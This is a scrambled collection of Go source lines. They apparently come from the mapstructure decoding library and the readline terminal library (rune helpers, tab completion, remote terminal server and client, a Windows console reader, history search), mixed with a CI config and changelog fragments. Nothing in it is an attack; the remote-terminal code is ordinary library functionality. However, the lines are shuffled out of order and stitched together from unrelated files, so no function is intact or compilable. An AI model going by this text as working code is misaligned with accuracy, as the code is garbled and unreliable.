val.SetUint(dataVal.Uint())
"reflect.Func,"
// Delete the key we're using from the unused map so we stop tracking
if squash 
"config: config,"
"Decoder) decodeArray(name string, data interface{}, val reflect.Value) error {"
valType := val.Type()
val.SetInt(i)
"// If the type of the value to write to and the data match directly,"
// Get the StructField first since this is a cheap operation. If the
val.Set(valSlice)
valArray = reflect.New(arrayType).Elem()
"return fmt.Errorf(""cannot parse '%s' as bool: %s"", name, err)"
 err != nil {
// Check input type
return err
// is tedious or difficult to get otherwise.
v := dataVal.MapIndex(k).Interface()
// Decodes an unknown data type into a specific reflection value.
switch v.Kind() {
sliceType := reflect.SliceOf(valElemType)
"valMap.SetMapIndex(currentKey, currentVal)"
"i, err := strconv.ParseInt(dataVal.String(), 0, val.Type().Bits())"
structs[0] = val
return decoder.Decode(input)
"Decoder) decodeString(name string, data interface{}, val reflect.Value) error {"
"// If the input data is a pointer, and the assigned type is the dereference"
// by the configuration.
if !v.Type().AssignableTo(valMap.Type().Elem()) {
converted := true
case dataKind == reflect.Bool:
// Set to empty allocated value
"i, err := strconv.ParseUint(dataVal.String(), 0, val.Type().Bits())"
// Package mapstructure exposes functionality to convert an arbitrary
err := d.decode(
"case dataType.PkgPath() == ""encoding/json"" "
"valSlice = reflect.Append(valSlice, reflect.Zero(valElemType))"
case dataKind == reflect.Float32 
inputVal = reflect.ValueOf(input)
case reflect.Int:
currentData := dataVal.Index(i).Interface()
DecodeHook DecodeHookFunc
"return d.decodeMapFromStruct(name, dataVal, val, valMap)"
// Compile the list of all the fields that we're going to be decoding
val   reflect.Value
val.SetBool(dataVal.Float() != 0)
"func WeakDecode(input, output interface{}) error {"
"for _, k := range dataVal.MapKeys() {"
"decoder, err := NewDecoder(config)"
val.SetInt(int64(dataVal.Float()))
"if err := d.decode(fieldName, k.Interface(), currentKey)"
 i < dataVal.Len()
Decoder{
"Metadata:         nil,"
"""encoding/json"""
for dataValKey := range dataValKeys {
DecoderConfig
// as an intermediary.
"err = d.decodeMap(name, input, outVal)"
switch {
//   - empty array = empty map and vice versa
" dataType.Name() == ""Number"":"
type DecoderConfig struct {
"return d.decodeSlice(name, []byte(dataVal.String()), val)"
valMap = reflect.MakeMap(mapType)
switch dataVal.Kind() {
"// Finally, set the value to the array we built up"
if d.config.Metadata != nil {
"// We have a DecodeHook, so let's pre-process the input."
if valSlice.IsNil() 
"// a decoder has been returned, the same configuration must not be used"
f := dataVal.Float()
rawMapKey = dataValKey
"Decoder) decodeMapFromMap(name string, dataVal reflect.Value, val reflect.Value, valMap reflect.Value) error {"
"Decoder) decodeMap(name string, data interface{}, val reflect.Value) error {"
"if err := d.decode(fieldName, rawMapVal.Interface(), fieldValue)"
// There was no matching key in the map for the value in
ZeroFields bool
"Result:           output,"
val.SetBool(dataVal.Int() != 0)
outputKind := getKind(outVal)
// The tag name that mapstructure reads for field names. This
// (extra keys).
valSlice := val
 v.Kind() != reflect.Struct {
"// Normal struct field, store it away"
fields := []field{}
Metadata) error {
// Metadata contains information about decoding a structure that
case reflect.Struct:
val.SetFloat(float64(dataVal.Int()))
ErrorUnused bool
isNil = v.IsNil()
"return fmt.Errorf(""cannot parse '%s' as uint: %s"", name, err)"
// Make a new map to hold our result
"mK, ok := dataValKey.Interface().(string)"
"//   - bools to int/uint (true = 1, false = 0)"
val.SetBool(b)
keyName = tagParts[0]
structs = structs[1:]
if !dataValType.AssignableTo(val.Type()) {
 inputVal.IsNil() {
"tagValue = strings.SplitN(tagValue, "","", 2)[0]"
x.Elem().Set(v)
case reflect.Uint8:
val.Set(realVal)
 kind != reflect.Interface {
// DecodeHookFuncType is a DecodeHookFunc which has complete information about
if dataVal.Bool() {
val.Set(nilValue)
func getKind(val reflect.Value) reflect.Kind {
Metadata 
"// If the data is nil, then we don't set anything, unless ZeroFields is set"
if val.CanAddr() {
"err = d.decodeBasic(name, input, outVal)"
"case reflect.Chan,"
"// and ""lift"" it into it. i.e. a string becomes a string slice."
switch dataValKind {
return reflect.Float32
"// WeakDecodeMetadata is the same as Decode, but is shorthand to"
if !dataVal.IsValid() {
"Result:   output,"
"return d.decode(name, data, val.Elem())"
"// DecodeHook, if set, will be called before any decoding and any"
// Empty maps turn into empty slices
return nil
if d.config.Metadata != nil 
"uints = make([]uint8, dataVal.Len(), dataVal.Len())"
"if tag == ""squash"" {"
dataType := dataVal.Type()
uints[i] = dataVal.Index(i).Interface().(uint8)
val.SetFloat(1)
"// If we had errors, return those"
nilValue := reflect.New(val.Type()).Elem()
"d.config.Metadata.Unused = append(d.config.Metadata.Unused, key)"
"// If the name is empty string, then we're at the root, and we"
"err = d.decodeInt(name, input, outVal)"
"reflect.Ptr,"
 kind != reflect.String 
if val.CanSet() {
 kind <= reflect.Float64:
"if err := d.decode(name, data, reflect.Indirect(val))"
"// If WeaklyTypedInput is true, the decoder will make the following"
f := typ.Field(i)
"return d.decodeStructFromMap(name, dataVal, val)"
"return fmt.Errorf(""cannot parse '%s' as int: %s"", name, err)"
// to true.
if d.config.WeaklyTypedInput {
"return fmt.Errorf(""cannot parse '%s', %d overflows uint"","
"if err := d.decode(fieldName, v, currentVal)"
 i < structType.NumField()
"panic(""field is not valid"")"
//   - single values are converted to slices if required. Each
"// If we can't set the field, then it is unexported or something,"
"// ZeroFields, if set to true, will zero fields before writing them."
case dataKind == reflect.Int 
 dataVal.Type().Elem() == val.Type() {
// to be the zero value.
"if f.PkgPath != """" {"
// into that. Then set the value of the pointer to this type.
if kind := dataValType.Key().Kind()
"Decoder) decodeMapFromSlice(name string, dataVal reflect.Value, val reflect.Value, valMap reflect.Value) error {"
if config.Metadata.Unused == nil {
 v.Kind() {
rawMapKey := reflect.ValueOf(fieldName)
val := reflect.ValueOf(config.Result)
DecoderConfig{
"Decoder) decodeUint(name string, data interface{}, val reflect.Value) error {"
if dataVal.Len() > arrayType.Len() {
continue
case reflect.Array:
"// we started with Kinds and then realized Types were the better solution,"
if !converted {
"return d.decodeMapFromSlice(name, dataVal, val, valMap)"
// the source and target types.
val.SetUint(uint64(f))
"// and ""lift"" it into it. i.e. a string becomes a string array."
"Decoder) decodeSlice(name string, data interface{}, val reflect.Value) error {"
if !inputVal.IsValid() {
dataKind := getKind(dataVal)
// Example: 
// First decode the key into the proper type
// type conversion (if WeaklyTypedInput is on). This lets you modify
"return d.decodeArray(name, []interface{}{data}, val)"
// Accumulate errors
case reflect.Map:
"fmt.Sprintf(""%s[%d]"", name, i),"
import (
"// DecodeMetadata is the same as Decode, but is shorthand to"
// This should never happen
"// Make a new array to hold our result, same size as the original data."
// doing case-insensitive search.
val.SetBool(dataVal.Bool())
"err = d.decodeFloat(name, input, outVal)"
vElemType := vType.Elem()
func NewDecoder(config 
"field, fieldValue := f.field, f.val"
val.SetInt(int64(dataVal.Uint()))
valMap := val
i := dataVal.Int()
"return d.decode("""", input, reflect.ValueOf(d.config.Result).Elem())"
kind := val.Kind()
"return d.decodeSlice(name, []interface{}{data}, val)"
"// match the ""input == nil"" below so we check that here."
for i := 0
"return result, nil"
// Accumulate any errors
"return fmt.Errorf(""cannot squash non-struct type '%s'"", v.Type())"
"// the decoding. If this is nil, then no metadata will be tracked."
// up the most basic Decoder.
case kind >= reflect.Int 
fieldType := structType.Field(i)
if d.config.DecodeHook != nil {
"mType := reflect.MapOf(vKeyType, vElemType)"
"fields = append(fields, field{fieldType, structVal.Field(i)})"
converted = false
val.Set(valArray)
type field struct {
"//   - bools to string (true = ""1"", false = ""0"")"
"config.Metadata.Unused = make([]string, 0)"
"""'%s' expected type '%s', got unconvertible type '%s'"","
currentVal := reflect.Indirect(reflect.New(valElemType))
key := rawKey.(string)
"return nil, errors.New(""result must be a pointer"")"
"type DecodeHookFuncType func(reflect.Type, reflect.Type, interface{}) (interface{}, error)"
if val.Kind() != reflect.Ptr {
config 
// The type should be DecodeHookFuncType or DecodeHookFuncKind.
"val.SetString(strconv.FormatFloat(dataVal.Float(), 'f', -1, 64))"
m := make(map[string]interface{})
val.SetString(string(uints))
"valMap.SetMapIndex(reflect.ValueOf(keyName), v)"
"// this is an embedded struct, so handle it differently"
return result
"result := d.decodeStructFromMap(name, mval, val)"
"""error decoding json.Number into %s: %s"", name, err)"
"d.config.DecodeHook,"
case dataKind == reflect.String 
"// If the input value is invalid, then we just set the value"
input = nil
dataValKeysUnused := make(map[interface{}]struct{})
for valSlice.Len() <= i {
"return fmt.Errorf(""cannot assign type '%s' to map value field of type '%s'"", v.Type(), valMap.Type().Elem())"
 d.config.ZeroFields {
"// data, keeping track of rich error information along the way in case"
if dataVal.IsNil() {
"i, err := jn.Int64()"
if fieldKind != reflect.Struct {
"Decoder) decodeStructFromMap(name string, dataVal, val reflect.Value) error {"
"keys := make([]string, 0, len(dataValKeysUnused))"
if input == nil {
// See the examples to see what the decoder is capable of.
"return fmt.Errorf(""%s: unsupported type: %s"", name, outputKind)"
// Keys are the keys of the structure which were successfully decoded
script:
language: go
  - go test
"  - ""1.11.x"""
  - tip
" If source map value is nil, then destination map value is nil (instead of empty)"
 to convert 
 to 
 Fix error when decode hook decodes interface implementation into interface
decodePtr
" If source slice value is nil, then destination slice value is nil (instead of empty)"
" If source pointer is nil, then destination pointer is set to nil (instead of"
 and 
  allocated zero value of type)
 Initial tagged stable release.
string
 [GH-133]
net.IPNet
 1.1.0
StringToIPHookFunc
 Fix panic that can happen in 
 1.0.0
 1.1.2
 1.1.1
 Support struct to struct decoding [GH-137]
net.IP
 Added 
  type. [GH-140]
module github.com/mitchellh/mapstructure
"copy(n, n[size:])"
return TabWidth
"func (Runes) Aggregate(candicate [][]rune) (same []rune, size int) {"
length 
1]) {
"unicode.Cf,"
"unicode.Hangul,"
"return r.EqualRune(a, b, true)"
for i := len(r) - len(sub)
'a'-'A' {
for pos := 0
"j], sub[j], fold) {"
if r == '
return n
"func (rs Runes) IndexAllBckEx(r, sub []rune, fold bool) int {"
"""bytes"""
func (Runes) WidthAll(r []rune) (length int) {
if len(r[i:]) < len(sub) {
 'A' <= a 
= idx 
if r[pos] == '
"""unicode"""
 i >= len(candicate[j
"idx := runes.Index('m', r[pos"
return 0
"func (rs Runes) IndexAllEx(r, sub []rune, fold bool) int {"
"copy(n, r)"
type Runes struct{}
if a == b {
033' 
return bytes.Repeat([]byte{'
"func (Runes) Index(r rune, rs []rune) int {"
"for i, r := range in {"
if i >= len(candicate[j]) 
if unicode.IsSpace(r) == false {
for j := 0
unicode.RangeTable{
continue
var zeroWidth = []
if !fold {
// Search in runes from front to end
return -1
if candicate[j][i] != candicate[j
"unicode.Mn,"
"if unicode.IsOneOf(doubleWidth, r) {"
return 2
break
"return rs.IndexAllBckEx(r, sub, false)"
"func (rs Runes) IndexAll(r, sub []rune) int {"
return true
 pos
n := runes.Copy(candicate[i])
if rs[i] == r {
if size > 0 {
"b'}, runes.WidthAll(r))"
aggregate:
 j < len(candicate)-1
"unicode.Me,"
return newr
import (
// Search in runes from end to front
func (Runes) Backspace(r []rune) []byte {
 i < len(rs)
"unicode.Cc,"
 i < len(candicate[0])
func (Runes) TrimSpaceLeft(in []rune) []rune {
 a <= 'Z' {
func (Runes) ColorFilter(r []rune) []rune {
candicate[i] = n[:len(n)-size]
 i < len(r)
if len(a) != len(b) {
var doubleWidth = []
"func (Runes) HasPrefix(r, prefix []rune) bool {"
"unicode.Hiragana,"
for i := 0
"func (rs Runes) IndexAllBck(r, sub []rune) int {"
"unicode.Han,"
2:])
same = runes.Copy(candicate[0][:size])
1] == '[' {
package readline
func (Runes) Copy(r []rune) []rune {
1][i] {
 i-- {
"newr := make([]rune, 0, len(r))"
"func (Runes) Equal(a, b []rune) bool {"
"return runes.Equal(r[:len(prefix)], prefix)"
if idx == -1 {
if a > b {
 i < len(candicate)
var TabWidth = 4
 pos < len(r)
firstIndex := len(in)
found := true
 j < len(sub)
"func (r Runes) EqualRuneFold(a, b rune) bool {"
return i
"unicode.Katakana,"
firstIndex = i
goto aggregate
"""unicode/utf8"""
var runes = Runes{}
if found {
"newr = append(newr, r[pos])"
return 1
"a, b = b, a"
t' {
 r[pos
"return rs.IndexAllEx(r, sub, false)"
"func (Runes) EqualRune(a, b rune, fold bool) bool {"
"func (r Runes) EqualFold(a, b []rune) bool {"
return false
"n := make([]rune, len(r))"
"if r.EqualRuneFold(a[i], b[i]) {"
 i >= 0
 i < len(a)
"return runes.EqualFold(r[:len(prefix)], prefix)"
found = false
pos 
if b == a
return
if a[i] != b[i] {
= runes.Width(r[i])
if b < utf8.RuneSelf 
size = i 
"if unicode.IsOneOf(zeroWidth, r) {"
"func (Runes) HasPrefixFold(r, prefix []rune) bool {"
func (Runes) Width(r rune) int {
if len(r) < len(prefix) {
if !rs.EqualRune(r[i
return in[firstIndex:]
return names
GetChildren() []PrefixCompleterInterface
"buf.WriteString(strings.Repeat("""
if len(line) == len(childName) {
"if strings.TrimSpace(string(p.GetName())) != """" {"
var lineCompleter PrefixCompleterInterface
GetDynamicNames(line []rune) [][]rune
"func doInternal(p PrefixCompleterInterface, line []rune, pos int, origLine []rune) (newLine [][]rune, offset int) {"
childNames[0] = child.GetName()
bytes.Buffer)
buf.WriteString(prefix)
"""bytes"""
"Name:     []rune(name),"
goNext := false
offset = len(line)
Children []PrefixCompleterInterface
PrefixCompleter) GetChildren() []PrefixCompleterInterface {
"Do(line []rune, pos int) (newLine [][]rune, length int)"
"tmpLine := make([]rune, 0, len(line))"
childNames = childDynamic.GetDynamicNames(origLine)
"buf.WriteString("" "")"
"buf.WriteString("""
goNext = true
"""strings"""
PrefixCompleter {
return buf.String()
PrefixCompleterInterface
"PrefixCompleter) Print(prefix string, level int, buf "
 childDynamic.IsDynamic() {
"func PcItemDynamic(callback DynamicCompleteFunc, pc ...PrefixCompleterInterface) "
type DynamicCompleteFunc func(string) []string
"if runes.HasPrefix(line, childName) {"
SetChildren(children []PrefixCompleterInterface)
p.Children = children
buf.WriteString(string(p.GetName()) 
"for _, child := range p.GetChildren() {"
PrefixCompleter) IsDynamic() bool {
Dynamic  bool
if goNext {
bytes.Buffer) {
var names = [][]rune{}
PrefixCompleter{
buf := bytes.NewBuffer(nil)
name 
continue
"func Print(p PrefixCompleterInterface, prefix string, level int, buf "
if line[i] == ' ' {
func NewPrefixCompleter(pc ...PrefixCompleterInterface) 
if ok 
} else {
return p.Dynamic
type PrefixCompleter struct {
"Dynamic:  false,"
"return PcItem("""", pc...)"
PrefixCompleter) GetDynamicNames(line []rune) [][]rune {
// Caller type for dynamic completion
"newLine = append(newLine, childName[len(line):])"
"childNames := make([][]rune, 1)"
import (
4)-2))
"PrefixCompleter) Do(line []rune, pos int) (newLine [][]rune, offset int) {"
level
"for _, name := range p.Callback(string(line)) {"
"ch.Print(prefix, level, buf)"
"return doInternal(p, line, pos, line)"
"return doInternal(lineCompleter, tmpLine, len(tmpLine), origLine)"
return p.Name
type PrefixCompleterInterface interface {
PrefixCompleter) SetChildren(children []PrefixCompleterInterface) {
if level > 0 {
"p.Print(prefix, 0, buf)"
package readline
"tmpLine = append(tmpLine, line[i:]...)"
"Children: pc,"
if len(line) >= len(childName) {
PrefixCompleter) GetName() []rune {
"func Do(p PrefixCompleterInterface, line []rune, pos int) (newLine [][]rune, offset int) {"
"newLine = append(newLine, childName)"
"func PcItem(name string, pc ...PrefixCompleterInterface) "
"Callback: callback,"
GetName() []rune
return 
"if runes.HasPrefix(childName, line) {"
"childDynamic, ok := child.(DynamicPrefixCompleterInterface)"
line = runes.TrimSpaceLeft(line[:pos])
offset = len(childName)
Name     []rune
return p.Children
 i < len(line)
IsDynamic() bool
if len(newLine) != 1 {
PrefixCompleter) Tree(prefix string) string {
"names = append(names, []rune(name"
lineCompleter = child
for i := offset
"= "" """
""" ""))"
func (p 
"newLine = append(newLine, []rune{' '})"
"Print(p, prefix, level, buf)"
return
"return doInternal(lineCompleter, nil, 0, origLine)"
"Print(prefix string, level int, buf "
"for _, childName := range childNames {"
""", (level"
type DynamicPrefixCompleterInterface interface {
Callback DynamicCompleteFunc
"for _, ch := range p.GetChildren() {"
"Dynamic:  true,"
case T_RAW:
T_ISTTY_REPORT
writeCtx {
"n, err := r.dataBuf.Read(b)"
case T_WIDTH_REPORT:
cfg.FuncOnWidthChanged = func(f func()) {
close(r.stopChan)
n   int
"writeCtx),"
if err := r.writeMsg(msg)
"Message) WriteTo(w io.Writer) (int, error) {"
go func() {
const (
"rl, err := NewEx("
"func NewMessage(t MsgType, data []byte) "
"return int(n), err"
"if _, err := io.ReadFull(r, m.Data)"
return cli.Serve()
screenWidth := GetScreenWidth()
"binary.BigEndian.PutUint16(data, 1)"
type MsgType int16
dataBuf  bytes.Buffer
"func ListenRemote(n, addr string, cfg "
default:
"""os"""
"""sync/atomic"""
"return reply.n, reply.err"
if r.isTerminal != nil {
T_WIDTH
cfg.FuncExitRaw = r.ExitRawMode
if atomic.LoadInt32(
if n == 0 
"return 0, err"
r.funcWidthChan()
return nil
if !ok {
r.HandleConfig(
"binary.BigEndian.PutUint16(data, uint16(screenWidth))"
// -----------------------------------------------------------------------------
"cfg, conn)"
"""bytes"""
return reply.err
if atomic.CompareAndSwapInt32(
err error
"binary.Write(buf, binary.BigEndian, m.Type)"
data  bytes.Buffer
r.raw.Exit()
bool
"ln, err := net.Listen(n, addr)"
cfg)
r.isTerminal = false
isTerminal    bool
"func DialRemote(n, addr string) error {"
"n, err := buf.WriteTo(w)"
"n, err := ctx.msg.WriteTo(r.conn)"
if err := onListen[0](ln)
"m := NewMessage(T_DATA, b)"
"RemoteCli, error) {"
"stopChan:   make(chan struct{}),"
cfg.FuncMakeRaw = r.EnterRawMode
if binary.BigEndian.Uint16(data) == 0 {
"return m, nil"
RemoteSvr) Close() error {
conn          net.Conn
"m, err = ReadMessage(buf)"
writeCtx
RemoteSvr) readLoop(buf 
if r.funcWidthChan != nil {
var length int32
os.Stdout.Write(msg.Data)
funcWidthChan func()
RemoteSvr) init(buf 
cfg.Stderr = r
r.funcWidthChan = f
RemoteCli) Serve() error {
"return r.writeMsg(NewMessage(T_RAW, nil))"
writeChan     chan 
"r.inited, 0, 1) {"
buf := bufio.NewReader(r.conn)
type RemoteCli struct {
"writeReply),"
msg   
go rs.writeLoop()
cfg.Stdout = r
"m.Data = make([]byte, int(length)-2)"
RemoteSvr) IsTerminal() bool {
if !atomic.CompareAndSwapInt32(
func NewRemoteSvr(conn net.Conn) (
writeCtx{
r.GotIsTerminal(m.Data)
r.dataBufM.Unlock()
if err := r.checkEOF()
RemoteCli) ServeBy(source io.Reader) error {
"conn, err := ln.Accept()"
// receive width
inited      int32
atomic.StoreInt32(
Type MsgType
r.readLoop()
 err == io.EOF {
length)
go rs.readLoop(buf)
writeChan:  make(chan 
RemoteCli) reportWidth() error {
rs := 
"binary.Write(buf, binary.BigEndian, int32(len(m.Data)"
r := 
if err := r.init()
<-r.reciveChan
"Instance), onListen ...func(net.Listener) error) error {"
case <-r.stopChan:
dataBufM sync.Mutex
Message
r.GotReportWidth(m.Data)
r.dataM.Unlock()
"r.writeMsg(NewMessage(T_EOF, nil))"
Message) 
if m.Type != T_WIDTH_REPORT {
"ctx := newWriteCtx(NewMessage(T_DATA, b))"
RemoteCli) readLoop() {
 err != nil {
"""encoding/binary"""
for {
RemoteCli) Close() {
return err
} else {
RemoteSvr) writeLoop() {
reciveChan    chan struct{}
RemoteSvr) ExitRawMode() error {
"return r, nil"
"buf := bytes.NewBuffer(make([]byte, 0, len(m.Data)"
RemoteCli) init() error {
break
RemoteSvr) writeMsg(m 
h(rl)
RemoteSvr) GetWidth() int {
type writeReply struct {
isTerminal = DefaultIsTerminal()
if err != nil {
RemoteSvr) GotReportWidth(data []byte) {
r.width))
func newWriteCtx(msg 
r.dataBuf.Write(m.Data)
if err := r.reportIsTerminal()
cfg.Stdin = r
reply chan 
"""fmt"""
RemoteCli{
case T_ISTTY_REPORT:
RemoteCli) MarkIsTerminal(is bool) {
switch msg.Type {
import (
r.writeChan <- ctx
break loop
Data []byte
cfg.FuncIsTerminal = r.IsTerminal
return r.ServeBy(os.Stdin)
raw         RawMode
func ReadMessage(r io.Reader) (
defer r.raw.Exit()
if err := rs.init(buf)
"RemoteSvr) Read(b []byte) (int, error) {"
"reciveChan: make(chan struct{}),"
"binary.BigEndian.PutUint16(data, 0)"
RemoteSvr{
"func HandleConn(cfg Config, conn net.Conn) ("
"conn:       conn,"
T_ERAW // exit raw
select {
stopChan      chan struct{}
"""net"""
"cli, err := NewRemoteCli(conn)"
type RemoteSvr struct {
r.reportWidth()
"conn, err := net.Dial(n, addr)"
defer conn.Close()
"width:      -1,"
if isTerminal {
if m.Type != T_ISTTY_REPORT {
"return len(b), err"
// register sig for width changed
writeReply
ctx := newWriteCtx(m)
"writeReply{n, err}"
package readline
r.isTerminal = 
"r.closed, 0, 1) {"
RemoteSvr) GotIsTerminal(data []byte) {
isTerminal = 
bufio.Reader) {
"receiveChan: make(chan struct{}),"
switch m.Type {
"RemoteCli) Write(b []byte) (int, error) {"
Message) error {
buf.Write(m.Data)
reply: make(chan 
"_, err := m.WriteTo(r.conn)"
T_RAW
r.eof) == 1 {
"n, err = r.dataBuf.Read(b)"
"n, _ := io.Copy(r, source)"
"m, err := ReadMessage(buf)"
T_WIDTH_REPORT
"return rl, nil"
"r.width, int32(binary.BigEndian.Uint16(data)))"
case r.reciveChan <- struct{}{}:
return 
m.Type)
"RemoteSvr) Write(b []byte) (int, error) {"
"r.eof, 1)"
if n == 0 {
RemoteSvr) EnterRawMode() error {
"return fmt.Errorf(""unexpected init message"")"
case T_DATA:
"if err := binary.Read(r, binary.BigEndian, "
buf := bufio.NewReader(rs.conn)
RemoteSvr) HandleConfig(cfg 
eof           int32
type writeCtx struct {
"return nil, err"
r.isTerminal = true
T_EOF
"RemoteSvr, error) {"
receiveChan chan struct{}
func NewRemoteCli(conn net.Conn) (
var isTerminal bool
closed        int32
"msg, err := ReadMessage(buf)"
"Message, error) {"
r.isTerminal
T_DATA = MsgType(iota)
"msg:   msg,"
ctx.reply <- 
reply := <-ctx.reply
RemoteCli) reportIsTerminal() error {
loop:
"data := make([]byte, 2)"
RemoteCli) writeMsg(m 
case T_ERAW:
func (m 
"msg := NewMessage(T_WIDTH_REPORT, data)"
Config) {
"conn:        conn,"
DefaultOnWidthChanged(func() {
"return n, err"
"msg := NewMessage(T_ISTTY_REPORT, data)"
"""io"""
width         int32
"Message{t, data}"
"return r.writeMsg(NewMessage(T_ERAW, nil))"
"""bufio"""
"""sync"""
cfg.FuncGetWidth = r.GetWidth
r.raw.Enter()
Message {
"r, err := NewRemoteSvr(conn)"
func (r 
m := new(Message)
r.conn.Close()
conn        net.Conn
case T_EOF:
"Instance, error) {"
dataM sync.Mutex
return
r.dataBufM.Lock()
bufio.Reader) error {
defer r.Close()
"case ctx, ok := <-r.writeChan:"
isTerminal  
RemoteSvr) checkEOF() error {
// receive isTerminal
type Message struct {
return io.EOF
return int(atomic.LoadInt32(
if len(onListen) > 0 {
r.dataM.Lock()
return r.isTerminal
"Config, h func("
"rl, err := HandleConn("
"return rs, nil"
if err := r.reportWidth()
"return r.writeEsc(buf, char)"
VK_RSHIFT   = 0xA1
VK_MENU     = 0x12
r.ctrlKey = false
target = CharNext
VK_TAB      = 0x09
var err error
RawReader) Close() error {
return n 
VK_DELETE   = 0x2E
"return 0, err"
return nil
next:
case VK_DOWN:
switch char {
if ker.bKeyDown == 0 { // keyup
target = CharBackward
"case VK_RCONTROL, VK_LCONTROL:"
ctrlKey bool
case VK_BACK:
RawReader {
"n := copy(b, []byte(string(char)))"
r.altKey = false
VK_BACK     = 0x08
"err = kernel.ReadConsoleInputW(stdin,"
case VK_MENU: //alt
char = CharLineEnd
char = CharBackspace
"RawReader) writeEsc(b []byte, char rune) (int, error) {"
if ker.unicodeChar == 0 {
target = CharForward
VK_UP       = 0x26
var target rune
"return r.write(buf, char)"
char = CharLineStart
if ir.EventType != EVENT_KEY {
VK_ESCAPE   = 0x1B
if r.ctrlKey {
// RawReader translate input record to ANSI escape sequence.
// only process one action in one read
if err != nil {
r.altKey = true
"n := copy(b[1:], []byte(string(char)))"
uintptr(unsafe.Pointer(
VK_CANCEL   = 0x03
 r.altKey {
case 'E':
var read int
VK_CONTROL  = 0x11
case 'R':
"import ""unsafe"""
VK_LEFT     = 0x25
VK_RIGHT    = 0x27
char = CharFwdSearch
if target != 0 {
goto next
// To provides same behavior as unix terminal.
case VK_RIGHT:
case VK_LEFT:
package readline
altKey  bool
if r.ctrlKey 
_KEY_EVENT_RECORD)(unsafe.Pointer(
ir.Event[0]))
return r
VK_RETURN   = 0x0D
033'
b[0] = '
target = CharPrev
VK_LSHIFT   = 0xA0
"return n, nil"
case VK_UP:
VK_DOWN     = 0x28
ir := new(_INPUT_RECORD)
"return r.write(buf, target)"
"RawReader) Read(buf []byte) (int, error) {"
switch ker.wVirtualKeyCode {
VK_LCONTROL = 0xA2
r := new(RawReader)
case 'S':
"uintptr(unsafe.Pointer(ir)),"
r.ctrlKey = true
ker := (
"RawReader) write(b []byte, char rune) (int, error) {"
build windows
"read)),"
" 1, nil"
func NewRawReader() 
VK_RCONTROL = 0xA3
} else if r.altKey {
func (r 
char := rune(ker.unicodeChar)
VK_SHIFT    = 0x10
type RawReader struct {
case 'A':
char = CharBckSearch
const (
033[4m 
Config
"w:       w,"
if x < 0 {
"n""), lineCnt))"
"o.markStart, o.markEnd = 0, 0"
"return o.history.FindBck(isNewSearch, o.data, o.buf.idx)"
source    
"""container/list"""
S_DIR_FWD
data      []rune
o.state = S_STATE_FOUND
opSearch) SearchBackspace() {
"""bytes"""
opSearch) IsSearchMode() bool {
item := o.history.showItem(o.history.current.Value)
lineCnt := o.buf.CursorLineCount()
o.data = o.data[:len(o.data)-1]
if revert {
S_STATE_FAILING
RuneBuffer
"Config, width int) "
type opSearch struct {
return o.inMode
opSearch{
o.dir = dir
o.buf.Set(o.history.showItem(o.history.current.Value))
o.state = S_STATE_FAILING
"cfg:     cfg,"
"width:   width,"
alreadyInMode := o.inMode
if x == -2 {
markEnd   int
"033[J"")"
"func newOpSearch(w io.Writer, buf "
len(o.data)
"buf.WriteString("""
S_STATE_FOUND = iota
opSearch {
opSearch) SearchMode(dir int) bool {
o.inMode = true
"033[%dC"", x) // move forward"
"buf.WriteString(""failing "")"
o.inMode = false
x = o.buf.idx
history   
"history: history,"
"buf.WriteString(""fwd"")"
o.SearchRefresh(-2)
width     int
"buf.WriteString(""-i-search: "")"
o.source = o.history.current
o.history.current = elem
markStart int
dir       int
"idx, elem := o.findHistoryBy(isChange)"
buf := bytes.NewBuffer(nil)
inMode    bool
o.search(false)
} else {
"RuneBuffer, history "
list.Element
func (o 
= o.buf.PromptLen()
o.width = newWidth
return true
buf       
if o.markStart > 0 {
buf.WriteString(string(o.data))         // keyword
if len(o.data) > 0 {
"""fmt"""
opSearch) SearchRefresh(x int) {
import (
opSearch) search(isChange bool) bool {
= len(o.data)
"opHistory, cfg "
opSearch) OnWidthChange(newWidth int) {
"return o.history.FindFwd(isNewSearch, o.data, o.buf.idx)"
"opSearch) findHistoryBy(isNewSearch bool) (int, "
} else if x >= 0 {
o.source = nil
x = o.buf.CurrentWidth(x)
"033[%dA"", lineCnt) // move prev"
o.search(true)
o.w.Write(buf.Bytes())
S_DIR_BCK = iota
package readline
if o.dir == S_DIR_BCK {
if x > 0 {
state     int
"buf.WriteString(""bck"")"
idx 
if o.width == 0 {
if o.state == S_STATE_FAILING {
"fmt.Fprintf(buf, """
"033[0m"")      // _"
if elem == nil {
return 
list.Element) {
o.data = nil
o.history.current = o.source
"buf.Write(bytes.Repeat([]byte("""
"start, end = idx, idx"
x = x % o.width
w         io.Writer
opSearch) SearchChar(r rune) {
opHistory
return false
} else if o.dir == S_DIR_FWD {
opSearch) ExitSearchMode(revert bool) {
if len(o.data) == 0 {
"""io"""
o.SearchRefresh(idx)
"o.data = append(o.data, r)"
if alreadyInMode {
"o.buf.SetWithIdx(idx, item)"
cfg       
"start, end := 0, 0"
o.SearchRefresh(-1)
"o.buf.SetStyle(o.markStart, o.markEnd, ""4"")"
"o.markStart, o.markEnd = start, end"
"buf:     buf,"
const (
"if c.InterruptPrompt == """" {"
c.Stdin = NewCancelableStdin(Stdin)
i.GenPasswordConfig()
"// prompt supports ANSI escape sequence, so we can color some characters even in windows"
"c.InterruptPrompt = """""
return i.Operation.Slice()
Config) (
// readline will persist historys to file where HistoryFile specified
Config
Painter Painter
Prompt string
"import ""io"""
// it use in IM usually.
Instance) Stdout() io.Writer {
EnableMask bool
panic(err)
// > test[cursor]
// HistoryEnable the save of the commands into the history (default on)
i.Operation.Refresh()
"Instance) ReadPasswordEx(prompt string, l Listener) ([]byte, error) {"
func (c Config) Clone() 
Instance) IsVimMode() bool {
type Instance struct {
return i.Operation.PasswordWithConfig(cfg)
i.Operation.SetMaskRune(r)
return old
return nil
println(line)
"n"" {"
defaultPainter{}
func (l 
func New(prompt string) (
return c.FuncIsTerminal()
"Terminal:  t,"
TabCompleter{}
Instance) HistoryDisable() {
Instance{
c.FuncIsTerminal = DefaultIsTerminal
Instance) SetConfig(cfg 
// gives
"Config) ([]byte, error) {"
return cfg
inited    bool
opSearch  
return i.Operation.Stdout()
 l.Error != nil
// ie :
if c.Stderr == nil {
if c.HistoryLimit == 0 {
i.Operation.ResetHistory()
// WriteStdin prefill the next Stdin fetch
"//  _, _= i.Readline()"
// force use interactive even stdout is not a tty
Line  string
EOFPrompt       string
Instance) HistoryEnable() {
if c.FuncOnWidthChanged == nil {
i.Operation.SetPrompt(s)
// Next time you call ReadLine() this value will be writen before the user input
MaskRune   rune
Instance) Close() error {
Instance) Line() 
c.opHistory = nil
// Any key press will pass to Listener
Instance) SetHistoryPath(p string) {
